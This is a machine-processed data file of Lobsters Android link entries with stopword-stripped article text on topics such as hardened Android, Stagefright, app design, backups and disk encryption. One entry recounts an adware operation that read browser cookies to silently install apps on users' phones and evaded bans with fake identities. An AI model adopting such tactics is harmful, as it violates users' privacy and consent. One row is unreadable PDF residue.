430,Lobsters,android,Android,Copperhead OS - A hardened version of Android,https://copperhead.co/android,copperhead o hardened version android,protection zerodays hardened c standard library compiler toolchain hardened kernel stronger sandboxing isolation apps service privacy enabled default backported security feature quicker patching firewall network hardening sourceavailable free proprietary service securitycentric user experience change,use latest topoftheline google secure android phone without worrying access dataprotection zerodaysprevents many vulnerability make exploit harderhardened c standard library compiler toolchaincatches memory corruption integer overflowshardened kernelkernel selfprotection high quality aslrstronger sandboxing isolation apps servicesstricter selinux policy seccompbpf moreprivacy enabled defaultstrong privacy control tracking service morebackported security feature quicker patchingbenefiting upstream change long stockfirewall network hardeningalong improvement like mac randomizationsourceavailable free proprietary servicesuses alternative google appsservices like fdroidsecuritycentric user experience changesbetter default finergrained permission control
431,Lobsters,android,Android,React Native for Android: How we built the first cross-platform React Native app,https://code.facebook.com/posts/1189117404435352/,react native android built first crossplatform react native app,react native io react native android ad manager app choosing react native building ad manager io first relay graphql navigator interactionmanager shipping android version learned facebook moving unified repository,earlier year introduced react native io react native brings developer used react web declarative selfcontained ui component fast development cycle mobile platform retaining speed fidelity feel native application today happy release react native android facebook using react native production year almost exactly year ago team set develop ad manager app goal create new app let million people advertise facebook manage account create new ad go ended facebook first fully react native app also first crossplatform one post like share built app react native enabled u move faster lesson learned choosing react native long ago react native still new technology proven production developing new app based technology carried risk outweighed potential upside first initial team three product engineer already familiar react second app needed contain lot complex business logic accurately handle difference ad format time zone date format currency currency convention much already written javascript prospect writing code objectivec later write java android version app appealing would efficient third react native would easy implement ui surface wanted build displaying lot data form list table graph product engineer could immediately productive implementing view long knew react course feature presented challenge new platform example image editor let advertiser zoom crop photo map view let advertiser target people within certain radius location another example breadcrumb navigation help advertiser visualize hierarchy ad account provided opportunity u push platform building ad manager io first team decided develop io version app first aligned well react native also developed first io grew team three eight engineer following month new recruit familiar react familiar javascript eager build great mobile experience advertiser ramped quickly experienced io engineer react native team helped u bridge feature yet available react native providing access phone camera roll also helped u bundle app facebook existing io library already used facebook apps perform authentication analytics crash reporting networking push notification let team focus building product mentioned able reuse lot preexisting javascript library one library relay facebook framework delivering data react application via graphql another set library dealt internationalization localization tricky time zone currency involved normally library load right configuration json endpoint website wrote script export json file supported locale included file app using io localized bundle exposed json data javascript line native code allowed library work nearly unchanged one bigger challenge faced navigation flow navigating advertiser existing ad campaign wanted breadcrumb navigation bar ad creation flow needed wizardstyle navigation bar top also crucial get transition animation touch gesture right otherwise app would felt like glorified mobile website native app solution navigator component made available along react native customcomponents directory essence react component keep track set react component stack display one component animate based button press touch gesture also pluggable navigation bar component let u implement ioslike navigation bar regular view breadcrumb navigating ad campaign wizardlike stepper creation flow navigation bar component notified animation progress perform necessary animation increment match mean animation view navigation bar computed javascript test showed still able perform fps one way navigation animation could stutter javascript thread blocked big operation encountered scenario almost exclusively due processing large amount newly fetched data course make sense navigate new view data loaded processed sufficiently fast network process could easily interfere navigation animation still progress solution explicitly delay data processing animation complete using interactionmanager component also ship part react native would first animate view contained placeholder let relay data processing automatically caused necessary react component rerender shipping android version ad manager io close shipping started looking building android version app react native port android seemed like best way make work fortunately react native team already hard work creating naturally wanted reuse much app code possible business logic also ui code view largely save styling course place android version needed look feel different io version instance term navigation using native ui element date picker switch etc fortunately react native packager block list feature react abstraction mechanism helped u lot maximizing code reuse across two platform minimizing need explicit platform check io told packager ignore file ending androidjs android development ignored file ending iosjs could implement component android io consuming code would oblivious platform instead introducing explicit ifelse check platform tried refactor platformspecific part ui separate component would android io implementation time shipping ad manager android approach yielded around percent reuse app code bigger challenge faced manage source code android io codebases managed two different repository facebook source code ad manager io lived io repository course code android version would live android repository various reason example much like io version wanted make use facebook android library lived android repository addition build tool automation continuous integration android apps hooked android repository given android port app required refactoring existing io code abstract platformspecific component file would essentially constantly forking merging two version codebase seemed like unacceptable situation u end decided designate io repository source truth mostly already io version app mature set cronjob synced javascript code io android repository many time day committing javascript android repository discouraged permitted followed accompanying commit io repository sync script detected discrepancy filed task investigation also made possible javascript packager server run android code io repository way product developer touched mostly javascript native code could develop test change io android directly io repository still required built native part android app android repository io app huge tax testing change two platform speed flow javascriptonly developer also built script downloaded appropriate native binary continuous integration server made unnecessary even keep clone android repository developer could javascript development source truth io repository iterate fast faster facebook web stack learned react native team developed platform alongside app exposed native component apis needed make happen component benefit everyone building app future even build component using react native pure native still would worth would write component anyway probably reusable team road one lesson learned working across separate io android code repository difficult even lot tool automation building app facebook used model build automation developer process set around however work well product part single shared javascript codebase fortunately facebook moving unified repository platform one copy common javascript code necessary syncs thing past another lesson learned concerned testing making change every engineer must careful test platform process prone human error inevitable consequence developing crossplatform app codebase said cost occasional mishap due insufficient testing far outweighed development efficiency gained using react native able reuse code across platform first place keep mind lesson apply product engineer also applies react native platform engineer working objectivec java much work engineer purely limited respective native language also affect javascript example component apis partially shared implementation native io engineer typically used test change android reverse true android engineer mainly cultural gap took time effort close result time stability increased also addressed problem building integration test would run every revision worked box catching io issue io likewise android continuous integration system set run android test io revision vice versa took engineering effort solve still large enough margin error occasionally break app said done bet paid able ship facebook first fully react native app two platform native look feel built team javascript engineer engineer familiar react joined team yet built io app native look feel five month additional three month released android version app effort inclusive language edited post replace black list block list
432,Lobsters,android,Android,Exploiting Android Users for Fun and Profit,http://www.codeword.xyz/2015/08/09/exploiting-android-users-for-fun-and-profit/,exploiting android user fun profit,exploiting android user fun profit dark past first attempt yanked appgratis dropped banhammer collision two world app store excuse comment,exploiting android user fun profit dark going tell stuff done particularly proud happened period life working company advertising industry company already pretty strong handle email display advertising market team hired newer group whose job break desktop advertising game may immediately apparent mean advertising guarantee run point every time grandma call weekend complaining computer running slow fire copy internet explorer find got twenty different toolbars installed encountered kind thing team working every time tried install open source software google link pay attention checkboxes installer ended half dozen useless registry scanner disk cleaner socalled program unintentionally installed computer may thank way apology ever meet real life buy beer promise please try resist urge punch sorry involvement everything read morbidly interesting desktop side thing might may expand future post going tell little bit eventually branched desktop business settled stable channel revenue company namely mobile advertising first attemptsthe advertising industry largely driven look moneymaking model working well someone else copy get early enough truck one manager used say stand make lot money rising competition turn race bottom profit dry approached advertising mobile first first product app io offered user free app every day implication offered app would otherwise free another app called appgratis pretty well wanted action app flop straight gate development philosophy involved pumping productionready product within day something going take longer get wild worth meant including first io effort buggy mess idea would throw loweffort proofofconcept wall see stuck best quickly iterate finetune maximize profit one really stick probably due fact game apps nobody wanted b already free app store make effort provide actual value user provide value publisher nobody using app whole thing ended moot anyway shortly got app store apple yanked appgratis basically banned style apps forever pay attention soon discover start common pattern struggle iron fist long took get new change app store left sour taste decided move android big money android time came form ad would appear notification center even app generated running company called airpush le market cornered pushads set emulate carve little corner since company already vast supply ad email display channel pretty easy churn quick proofofconcept sdk android would tap existing ad feed push notification center became game attracting developer use network optimizing sdk ad maximize profit went okay developer acquisition problem never really due unwillingness actually put effort quality control anything improving quality product directly lead increased profit generally frowned upon discouraged google dropped banhammer pushads outlawed cut deep enough profit longer worth spending time resource supporting ad network basically moved collision two worldsthis strayed usual path identifying existing market jump actually developed something far know pretty novel mentioned earlier already developed desktop advertising thriving channel business came way piggyback mobile distribution existing desktop distribution model pumped quick dirty time form window would distribute desktop installer network another checkbox people miss new app would sit system tray silently running background app ask android spent time looking apps app store desktop computer may noticed button signed let install apps directly phone click button desktop app automagically appears phone probably guess going web browser really great job protecting cooky computer go hell back protecting webbased attack crosssite scripting injected iframes etc actually trusted executed cooky trivial ie store bunch plaintext file directory firefox chrome store unprotected plaintext sqlite database time anyway new little desktop app quickly distributed million unsuspecting checkboxignoring user would existing google session reading browser cooky invisibly app store install button apps paying u distribution started optin screen notification letting user know signed free platform sent new app quickly learned user became aware going point process would remove app lose user aduh time notification optin screen away much possible already page eula trying install paintnet accidentally clicked wrong download button anyway right calling platform soon took new meaning u usually bizspeak service help user discover new apps want use normally find buried deep app store case meant user would wake morning new apps phone idea got several first apps pushed tracking apps would allow u call home gather statistic user nature product meant apps available google app probably imagine comment rating looked like apps certainly learned new profanity insult also learned good google banning developer account particularly low point talking google employee newlygenerated voip phone number assumed name trying activate new developer account prepaid credit card madeup address several state away logging managing developer account done remotely amazon instance since ip address permabanned around time started looking new job excusesthe stuff worked job complete horseshit provided absolutely zero value anybody existed expressly optimized sole purpose exploiting nontechsavvy computer user generate undeserved profit much understood generally unaware source revenue u considered good thing often joked knew whole time working felt shitty couple year shitty enough keep selling reasonable paycheck three free lunch every week good benefit since moved new state new job different le soulsucking industry feel really really good decision working thing actually provide value user moral story entirely sure maybe pay bill consideration exploring new job opportunity live somewhere idea thing helped build still alive left still problem identifying good user push desktop app someone owned android logged google desktop enabled ability push apps app store phone small segment total universe desktop user meaning even though able make insane amount money user got able get many user neverending google account closure boot surprise product eventually tossed heap along failed endeavor make way next milliondollaridea though last thing working left reverseengineering itunes installed apps hope developing similar distribution model io knew possible couple chinese product could push signed apps directly io device already end post apologizing everything working definite fact made thousand least people life little bit worse effort still bug mean managed escape conscience still somewhat intact please tell grandma sorry upgrade browser comment
434,Lobsters,android,Android,The War for Control of the Mobile Web is About to Heat Up,https://medium.com/@TechnoCharms/the-war-for-control-of-the-mobile-web-is-about-to-heat-up-47b73ee501fe,war control mobile web heat,design matter material design business model differentiation advertising company cost user privacy consumer hardware technology apple literally perfected art form bordering religion product design mission icloudbased apps number keynote open source developer technology distribute promote material design native java mobile apps android web apps epic battle developer loyalty apple continues pour syrup slather butter phonegap famous starter ignite bootstrapjs reactjs design thinking,material design display google map app iosdesign mattersyou may noticed recent trend design mobile web apps certain totally flat design aesthetic interesting new animation effect button ripple subtly textured layer seen sliding top otherwhat seeing whether realize unified expression google design thinking expressed design ethos called material design despite surface esoteric effort term providing plumbing nonproprietary design guideline material design secret mission blow hole apple differentiation give mobile advantage back googlematerial design secret mission blow hole apple differentiation give mobile advantage back googlesince material design google initiative project likely seen least apps unique style especially android device spend much time google web applicationsin fact even io famously referred apple walled garden infiltrated particular coincidence term strategic mindshare would argue material design might important contribution open source advancement industry google made since release androidbusiness model differentiationwe start see type design thinking might impact big picture first need take look business model google apple different beastsdespite broadly associated internet search email software service mass google aptly thought advertising company differentiated use internetcentric platform service primary delivery mechanism driving advantage dominant search video email platform google milked epic cash cow well decade becoming highly profitable technology behemoth breadth reach cash position allowed subsidize free product service advertising reach cost user privacyapple hand straight consumer hardware technology brand looking emphasis apple place hardware hinge excellence design quality vertical integration highly lockeddown proprietary software stack see preference vendor lockin major theme protect allimportant brand user experience premium devicesthe barrier entry competitor apple phenomenally high considering investment ip global brand awareness supply chain alone however barrier hinge upon maintenance unassailable consumer brand desire apple literally perfected art form bordering religion product design missionin technical strategy term web apps searched google increase reach google ad creating new content page link search resultsas io surged popularity mobile begun encroach web usage google struggling avoid locked mobile ad revenue due lack search deep data built io mobile apps battle behemoth matchup see increase webbased internet usage playing google strength web apps service helping retain deep link webbased apps indistinguishable native mobile appsapple blind spot web platform service especially developer google aptly exploiting apple much le dependent upon web service application much interested driving adoption proprietary apps apple much leverage crossplatform technology like java javascript feature open webbased internetindeed apple accommodated web technology absolutely needed promote crossplatform access important application safari webkit component allow web access io well highly polished ok gorgeous icloudbased apps number keynote come really embracing web technology open rest api access developer tool web developer really nothing build uponon hand appengine google apps even android use java app development language google clearly opposite camp driving adoption web technology web app development mean google retains shot web searchable content expanding footprint advertising reach popcorn witness alternate ending google v apple showso see google firing shot apple bow direct assault apple core competency design using strongsuit web open source developer technology distribute promote material design native java mobile apps android web apps reason sit reach popcorn witness alternate ending google v apple show beginning end day famously unsexy google app designsthe epic battle developer loyaltyso unfolding scene see battlefield come focus apple continues pour syrup slather butterwith new proprietary incredibly compelling apis surrounding apple watch expansion home automation health research application content ecosystem itunes burden developer learn complex proprietary apis platform explicitly incompatible platform high price paypartially state affair mobile web seeing renewed interest developer may previously written wellfounded complaint performance real app look feel developer drawn mobile native wrapper like phonegap allow web apps access native apis web technology project like famous allows nativespeed performance web animation ui component crossplatform backend platform like starter ignite make easier create mobile web apps work different devicesand web developer mobile otherwise standing still past year mobile marched forward component library ui toolkits like bootstrapjs reactjs made huge gain creating beautiful dynamic web application standardized usage greatly improved productivity consistency web app landscapeso landscape see google play material design card promoting new standard app look feel platform agnostic look feel fact thrives mixed webmobile webnative mobile hybrid environment google might succeed reclaiming lost ground searchable advertisementfriendly webby promoting current generation developer fed platform fragmentation increased workload faced developing supporting platform native android native io web google exploiting strength web application technology using blunt tool design thinking apple used dominate industry
435,Lobsters,android,Android,Shrimper - Material Design Android client for Lobste.rs,https://play.google.com/store/apps/details?id=com.thomasezan.shrimper,shrimper material design android client lobster,,shrimper best source programming software newsyou read programmingfocused site lobster able login comment article lobster ok shrimper let browse consume lobster content great source daily programming software content
436,Lobsters,android,Android,"Material Design is Different, Not Better",https://medium.com/android-news/material-design-is-different-not-better-87909af6ffe1,material design different better,material design shine design color animation flat ui trend meaningful animation perfect design language,material design shinesdon get wrong lot thing material design right seems like every designer sings praise without truly considering weaknessesdesign everchanging spec put people life forefront long life change design toofor one new design spec worldclass giving guidance variety design topic benefit beyond scope material designthe color animation guide material design truly remarkablethe concept card one generally work well across board flexible modular definitely work web designer using way mobile came along believe smaller screen le make senseas mentioned pastel color hardly new thing flat ui trend material design really popularized going back basic order achieve harmonious color beautiful typography great thing know foundation design better shape pillar come top itthe animation material design elegant delightful albeit innovative people make io came transitional interface still fairly new concept glad guide promoting smoother progressive animation guide user rather scream attentionmeaningful animation material designno perfect design languagethere never perfect design language template purpose piece discourage one offer perspective strength weakness design picking best intent go ahead experiment see work product forget consider people device designing
437,Lobsters,android,Android,Stagefright: It Only Takes One Text To Hack 950 Million Android Phones,http://www.forbes.com/sites/thomasbrewster/2015/07/27/android-text-attacks/,stagefright take one text hack million android phone,google worst android flaw ever drake billion use stagefright messenger samsung application sandbox nexus htc lenovo sony android hacker handbook privacyfocused blackphone version phone lab containing droid army black hat defcon cyanogenmod released fix,six critical vulnerability left per cent google android phone open attack delivered simple multimedia text mobile security expert warned today case phone parse attack code prior message opened exploit silent user would little chance defending data vulnerability said worst android flaw ever uncovered joshua drake zimperium zlabs reported bug april year said whilst google sent patch partner belief manufacturer made fix available protect customer device assumed vulnerable drake vice president platform research exploitation zimperium told forbes belief many million android phone could affected going figure suggesting billion use android phone version affected added weakness reside stagefright medium playback tool android remote code execution bug allowing malicious hacker infiltrate device exfiltrate private data attacker would need send exploit would mobile phone number drake noted could send exploit packaged stagefright multimedia message mm would let write code device steal data section phone reached stagefright permission would allow recording audio video snooping photo stored sd card bluetooth would also hackable via stagefright depending mm application use victim might never know even received message drake found exploit code opened google hangout would trigger immediately even look phone even get notification would possible delete message user alerted making attack completely silent added done lot testing ice cream sandwich galaxy default mm messaging application messenger one trigger automatically look mm trigger try play medium anything look drake added additional exploit could chained escalate privilege allowing wider access across phone drake said exploit fairly easy come android quite public researcher noted older device including samsung lg optimus elite exploitable process run systemlevel privilege providing wide access across phone totally confused would really nasty stuff already really need privilege escalation drake sent several vulnerability report along patch google april day later according drake google confirmed patch accepted would included future release reported second set issue google may may google confirmed patch scheduled total seven vulnerability fix ready emailed statement sent forbes google thanked drake reporting issue supplying patch noting manufacturer partner deploy coming week month android device including newer device multiple technology designed make exploitation difficult android device also include application sandbox designed protect user data application device spokesperson said time publication spokesperson responded question availability patch google nexus phone drake said nexus running latest firmware patched issue though specific said device running android version prior jelly bean version representing roughly million device inadequate exploit mitigation would nt prevent stagefright attack mm manufacturer typically slothlike getting patch user forbes contacted biggest android partner htc lg lenovo motorola samsung sony ask patch would made available none responded time publication collecting compiling information various party open problem unfortunately forthcoming noted drake coauthor android hacker handbook kind word one android phone manufacturer however silent circle creator privacyfocused blackphone smartphone applied drake fix mozilla whose firefox browser us stagefright run video praised quickly patching version bug provided cve number used record identify vulnerability include disclosure land today security professional malicious hacker alike enough information get cracking exploit manufacturer urged make haste addressing issue even information made available drake deserves much credit work finding fixing issue extraordinary phone lab containing droid army explains finding full black hat defcon security event taking place la vega next week update htc sent following response google informed htc issue provided necessary patch htc began rolling project early july project going forward contain required fix forbes asked htc actually mean customer download patch forbes understands google sent patch nexus owner indeed seems thus far single manufacturer shipped fix user google confirmed nexus update would rolling next week part regularly scheduled security update plan push safeguard nexus device starting next week releasing open source detail made public researcher black hat spokesperson said meanwhile cyanogenmod alternative android operating system released fix
441,Lobsters,android,Android,Shrimper - Lobste.rs reader for Android,http://goo.gl/forms/ymGpIRYwrB,shrimper lobster reader android,,never submit password google form
442,Lobsters,android,Android,An update on Eclipse Android Developer Tools,http://android-developers.blogspot.com/2015/06/an-update-on-eclipse-android-developer.html,update eclipse android developer tool,jamal eason android studio launch android studio excitement time migrate android studio migration guide overview page next step andmore project project source code google community,posted jamal eason product manager android past year team focused improving development experience building android apps android studio since launch android studio impressed excitement positive feedback official android ide android studio give access powerful comprehensive suite tool evolve app across android platform whether phone wrist car tv end focus effort making android studio better faster ending development official support android developer tool adt eclipse end year specifically includes eclipse adt plugin android ant build system time migrate chance migrate project android studio time get started download android studio many developer migration simple importing existing eclipse adt project android studio file import project shown detail migration process check migration guide also learn android studio underlying build system check overview page next step next month migrating rest standalone performance tool eg ddms trace viewer building additional support android ndk android studio focused android studio team deliver great experience unified development environment android tool inside eclipse continue live open source community via eclipse foundation check latest eclipse andmore project interested contributing learning new android studio excited integrate android studio development workflow also want contribute android studio also check project source code follow update android studio join google community
445,Lobsters,android,Android,Mobile App Design that Scales: Building for Existing and Fututre Devices,http://www.telerik.com/campaigns/mobile-app-design-that-scales,mobile app design scale building existing fututre device,challenge partnership community deliver expected,challenge demand better user experience continues grow time develop high quality modern engaging application continues shrink stop sweating ui focus part application truly make differencepartnership community like developer purpose life make developer superheroes enabling deliver expected faster expected nearly two decade partnering community two million developer help cut development time increase productivity make easy embrace latest technology user experience trendsdeliver expected using modern featurerich professionally designed ui component telerik kendo ui armed everything need deliver outstanding web mobile desktop experience le timewith backing legendary technical support provided directly developer build product confident best partner rely journey
446,Lobsters,android,Android,Announcing Security Rewards for Android,http://googleonlinesecurity.blogspot.com/2015/06/announcing-security-rewards-for-android.html,announcing security reward android,million dollar android security reward patch reward program mobile,posted jon larimer android security engineer since security reward program helped make google product safer everyone last year paid million dollar security researcher found vulnerability chrome google product today expanding program include researcher find fix prevent vulnerability android specifically detail new android security reward program vulnerability affecting nexus phone tablet available sale google play currently nexus nexus pay step required fix security bug including patch test make nexus first major line mobile device offer ongoing vulnerability reward program addition reward vulnerability program offer even larger reward security researcher invest test patch make entire ecosystem stronger largest reward available researcher demonstrate work around android platform security feature like aslr nx sandboxing designed prevent exploitation protect user android continue participate google patch reward program pay contribution improve security android open source project also sponsored mobile last year plan continue support competition find vulnerability android often said open security research key strength android platform security research focused android stronger become happy hunting
447,Lobsters,android,Android,Random Musings on the M Developer Preview: the Ugly (Part Two),http://commonsware.com/blog/2015/06/04/random-musings-m-developer-preview-bad-part-two.html,random musing developer preview ugly part two,random musing developer preview ugly part two moderately short ugly part one developer need backup backup system seems issue configure backup sqlcipher android wrench subscribing,random musing developer preview ugly part two post wrap series started monday continued tuesday moderately short wednesday ugly part one reviewing developer preview iow popular movie franchise like hunger trilogy go focus backup rant aim reduce background processing improve battery life railing backup would seem apple use american euphemism love backup fairly extensive backup regimen office even blog developer need backup however nontrivial privacy security issue suppose microsoft decade ago made announcement part window going automatically make copy file hard drive whatever subset choose server accordance term service worldwide right pretty much whatever want data exchange agree restore data pc suffers fatal calamity elect replace another window pc software timely fashion would expect congressional eu commission inquiry privacy advocate railing practice essence though google along simply reemphasizing though luck problem approach merely documentation error automatic backup enabled apps installed device running android preview additional app code required system provides user ability opt automatic data backup indicates user opt avoid backup meaning user presumably automatically optedin current developer preview work way backup optin process via setting app however backup process devicewide either apps backed none automatic backup feature preserve data app creates user device uploading google drive account encrypting google going emphasize backup encrypted however going work privacy security standpoint user supplying passphrase key information evidence part flow since backup system seems issue possible somewhere user supply backup key obvious available mnc however guess plan user supply key case google encryption algorithm key decrypt data whenever want keeping encrypted google drive might help case breach network security prevent google decrypting volition using data including sharing third party whether design duress real defense user developer term service agreement leave qualified legal counsel determine whether adequate decidedly nonlegalexpert opinion lead two issue app used data backed whereverwhenever using uscentric example apps hold medical data governed hipaa legal exposure app developer allowing google access app data like case google playing around app data people certainly sue google might come app developer well happens ecosystem amazon blackberry etc use android play service adopt autobackup stuff route server risk autobackup capability need granular support usersupplied pluggable backup transport word business able say backup data go server particularly business apps individual would prefer data backed somewhere server right also please note advertised really appears time backup restored user replaces device another one plenty possible problem human data entry error unexpected data corruption etc backup useful need implement sort stuff app data uniquely stored app automatically reflected server somewhere developer first opt short term adding android allowbackup false application element manifest work longerterm plan perhaps concert legal adviser give feedback risk exposure see four major implementation flavor emerging simply remain opted data backed opt android allowbackup true rely fact app significant data might represent sort privacy security risk google ship server example perhaps data actually server somewhere device merely holding cache note cache default backed opt configure backup back one file one contains data help connect user real backup maintaining separately allow compete basis sophistication backup still take advantage backup disaster recovery scenario make sure data going lead security issue example using url backup fine long access url defended separately opt encrypt data rest app part normal work example could using sqlcipher android database container matter google anyone back data data useless without encryption key perhaps wrench backup good disaster recovery good stock implementation risk developer incomplete deal disaster recovery developer need think backup work appropriate app user nervous newest version android affect app consider subscribing asking question office hour chat jun
450,Lobsters,android,Android,Security Analysis of Android Factory Resets,http://www.cl.cam.ac.uk/~rja14/Papers/fr_most15.pdf,security analysis android factory reset,,obj length filter flatedecode stream xڽ f sy z b r p b k
454,Lobsters,android,Android,Inside a $34 smartphone,http://projectgus.com/2015/05/inside-a-34-dollar-smartphone/,inside smartphone,vlad translated post cell phone used project fernvale hacdc wiki name xiaomi fitbitesque wrist band unboxing ken shirriff excellent usb charger teardown sloganeering hackvana pcbs translate phrase case using huami deceptive appearance cpu dual core systemonchip integrated partnership mozilla produce firefoxos smartphones ram compatibility pdf swap storage android version android api level camera much scam weirdness good next part online read,speak russian vlad translated post huami smartphone cost january sold inch screen bluetooth wifi cell connectivity android core processor picked electronics capital world shenzhen china hotel door mingtong digital communication market aka dodgy cell phone market mingtong buy huge array smartphones feature phone smart watch accessory fake mainstream brand brand cell phone used project fernvale sourced candid pic mingtong market courtesy hacdc wiki deal huami phone really buy decent smartphone name huami mashup brand name hua come huawei largest telecommunication company world mi come xiaomi hottest chinese smartphone company third largest smartphone maker world huami logo even mash together typography huawei xiaomi logo easy condemn opportunistic copypasting huawei xiaomi logo certainly western trademark lawyer would think actually bit creative though know really erodes major company reputation noone seems likely think buying huawei xiaomi almost like homage another littleknown company called huami technology 安徽华米 produced xiaomi fitbitesque wrist band think different huami completely though unboxing huami came retail box fauxfabric finish lot accessory spare battery headphone usb charger plugging charger watching ken shirriff excellent usb charger teardown demonstrated noisy dangerous cheap charger logo headphone looked kind familiar sloganeering text front read 华夏精品 米传天下 huáxià jīngpǐn mǐ chuán tiānxià slogan repeated place slogan continues brand mashup 华 start 华夏精品 hua huawei 米 start 米传天下 mi xiaomi translated think slogan mean something like grand chinese product rice spreading four corner earth rice alternatively millet mi xiaomi maybe also intended evoke feeling wholesomeness china home grown product world stage thanks mitch hackvana pcbs helping translate phrase alternative translation explanation please leave comment case unlike modern smartphones removable back cover battery come quite nifty alternative back cover incorporates book cover phone case style without adding thickness phone bad using huami video putting pace video smartphone almost ok apps downloaded google play ran phone locked playing game wifi bluetooth worked onscreen keyboard snappy screen bright clear however performance pretty slow time clear little low ram home screen would often reload scratch closing app much hope multitasking touch touch screen occasionally register got thought try daily phone week new zealand conference installing apps went back nexus could used week would frustrating deceptive appearance world dodgy cell phone specification like brand name deceptive even though label say new zealand ever saw connect speed grps edge also abnormality page setting despite nifty core cpu usage graph baseband version usually version number baseband drive cellular modem however dual quad core brand name highend smartphone systemonchip running hardware profiler app poking around adb shell android debugger shell confirms advertised spec good true cpu cat proccpuinfo processor processor rev processor bogomips processor bogomips feature swp half thumb fastmult vfp edsp thumbee neon cpu implementer cpu architecture cpu variant cpu part cpu revision hardware revision serial according proccpuinfo output processor spreadtrum dual core systemonchip integrated spreadtrum competitor mediatek low cost systemonachip market last year announced partnership mozilla produce firefoxos smartphones using chipset chip single core sibling core con job page modded custom visualisation added suggest much faster processor core sneaky ram amazing ram according google compatibility pdf android requires available ram even le android era amazed android even halfway usable meagre ram given terrible recent cheap smartphones ram spreadtrumhuami engineer could teach mainstream phone company something think swap cat procswaps filename type size used priority partition cat one trick help ram situation using zram compressing ram internally make fake swap space system ram massive allocated way another believe work situation storage also sneaky storage situation setting show internal space reality phone total internal storage usable apps storage data break like df filesystem size used free blksize dev mntasec mntobb system data cache productinfo lack storage matter much think microsd card slot work nicely apps install sd default system partition o pretty tiny nexus partition nearly full think hacky engineering feat done shrink android version last sneaky factor phone spec android kit kat released october number displayed many place even system profiler output however profiler also report api level android api level provide meaningful indication version apps need check android feature available level actually corresponds android ice cream sandwich released december really running ice cream sandwich build string changed say kit kat camera camera quite reasonable back front photo take great better vgaresolution feature phone much scam think seller mingtong market meant con market stall man woman behind counter told something several time think meant phone actually mediatek due speaking chinese sure said guess noone market intends trick customer completely spec everything market fake everyone know think fake spec meet need shenzhen migrant worker buy gift back home rural china people may ask many question technical detail someone buy one status symbol exactly phone performs le important look someone buy full knowledge sham long look fancy casual glance may money nice smartphone money fake nice smartphone someone buy wholesale resell le techsavvy backwater china probably rip people false claim weirdness unusual ui addition popped sure good think pretty remarkable suggests smartphones mozilla planning firefox o may tip iceberg said start using huami phone little bit clunky though still compare favourably cheap smartphones cost many time price last year friend bought euro lowend samsung smartphone android feel significantly laggy huami way load firefox o thing might different firefox o designed low end hardware sadly kernel bootloader source code available yet also see easy way get root access loading os possible least yet next watch space day part tearing taking look hardware edit part online read
455,Lobsters,android,Android,Anko – Pleasant Android development in Kotlin,https://github.com/JetBrains/anko,anko pleasant android development kotlin,page kotlin kotlinxcoroutines anko common wiki wiki wiki wiki anko layout wiki lambda dsl constraintlayout plugin anko sqlite wiki anko coroutines wiki using anko gradlebased project example project intellij idea project jcenter repository contributing pull request wiki,anko deprecated please see page information anko kotlin library make android application development faster easier make code clean easy read let forget rough edge android sdk java anko consists several part anko common lightweight library full helper intent dialog logging anko layout fast typesafe way write dynamic android layout anko sqlite query dsl parser collection android sqlite anko coroutines utility based kotlinxcoroutines library anko common anko common toolbox kotlin android developer library contains lot helper android sdk including limited intent wiki dialog toast wiki logging wiki resource dimension wiki anko layout wiki anko layout dsl writing dynamic android layout simple ui written anko dsl verticallayout val name edittext button say hello onclick toast hello nametext code creates button inside linearlayout attache onclicklistener button moreover onclick accepts suspend lambda write asynchronous code right inside listener note complete layout code xml required anko dsl constraintlayout since also plugin android studio support previewing anko dsl layout anko sqlite wiki ever tired parsing sqlite query result using android cursor anko sqlite provides lot helper simplify working sqlite database example fetch list user particular name fun getusers db managedsqliteopenhelper list user dbuse dbselect user wheresimple familyname john doexec parselist userparser anko coroutines wiki anko coroutines based kotlinxcoroutines library provides bg function executes code common pool asreference function creates weak reference wrapper default coroutine hold reference captured object finished canceled asynchronous framework support cancellation value use inside asynchronous block leaked asreference protects using anko gradlebased project anko metadependency plug available feature including common layout sqlite project dependency implementation orgjetbrainsanko anko ankoversion make sure ankoversion settled gradle file project level extankoversion need feature reference anko part dependency anko common implementation orgjetbrainsanko ankocommons ankoversion anko layout implementation orgjetbrainsanko ankoversion also available implementation orgjetbrainsanko ankoversion coroutine listener anko layout implementation orgjetbrainsanko ankoversion implementation orgjetbrainsanko ankoversion anko sqlite implementation orgjetbrainsanko ankosqlite ankoversion also number artifact android support library dependency anko common implementation orgjetbrainsanko ankoversion anko layout implementation orgjetbrainsanko ankoversion implementation orgjetbrainsanko ankocoroutines ankoversion implementation orgjetbrainsanko ankoversion design implementation orgjetbrainsanko ankodesign ankoversion implementation orgjetbrainsanko ankodesigncoroutines ankoversion implementation orgjetbrainsanko ankoversion percent implementation orgjetbrainsanko ankopercent ankoversion implementation orgjetbrainsanko ankoversion implementation orgjetbrainsanko ankoversion anko common implementation orgjetbrainsanko ankoversion anko layout implementation orgjetbrainsanko ankoversion constraintlayout implementation orgjetbrainsanko ankoconstraintlayout ankoversion example project showing include anko library android gradle project intellij idea project project based gradle attach required jar jcenter repository library dependency contributing best way submit patch send u pull request submitting pull request make sure existing test passing add new test required want add new functionality please file new proposal issue first make sure progress already question feel free create question issue instruction building anko available wiki
456,Lobsters,android,Android,Hardware-accelerated disk encryption in Android 5.1,http://nelenkov.blogspot.com/2015/05/hardware-accelerated-disk-encryption-in.html,hardwareaccelerated disk encryption android,post official documentation performance problem disable kernel crypto discussed crypto api aesni accelerating dmcrypt mapping table qualcomm crypto engine configuration xt wide block introducing integrating post parameter key management hardwarebacked keystore using hwaccelerated fde tarballs performance stability problem snapdragon summary,previous post looked disk encryption enhancement introduced android article written based lollipop preview release platform source code available post got detail hardwarebacked key protection right official documentation since released appears overly optimistic expecting highend lollipop device ship hardwareaccelerated disk encryption android come disk encryption enabled default least nexus device fde also brought performance problem many android enthusiast rushed disable slower disk access generally nt affect perceived performance using particular app longer load time add result slower switching apps well longer boot time order improve performance without sacrificing device security android integrated support hardwareaccelerated disk encryption device provide dedicated cryptographic hardware nexus unfortunately feature ended disabled current android release hopefully turned back future release post look implementation hardwarebacked disk encryption nexus show improves performance finally describe problem current implementation kernel cryptoas previously discussed android fde implementation based dmcrypt devicemapper target performs cryptographic operation via interface provided linux kernel crypto api kernel crypto api defines standard extensible interface cipher data transformation implemented kernel loadable module api support symmetric cipher aead cipher message digest random number generator collectively referred transformation transformation name priority well additional property describe block size supported key size example desktop linux system may support following cat proccrypto name aes driver aesgeneric module kernel priority refcnt selftest passed type cipher blocksize min keysize max keysize name aes driver aesaesni module kernel priority refcnt selftest passed type cipher blocksize min keysize max keysize name aes driver aesasm module kernel 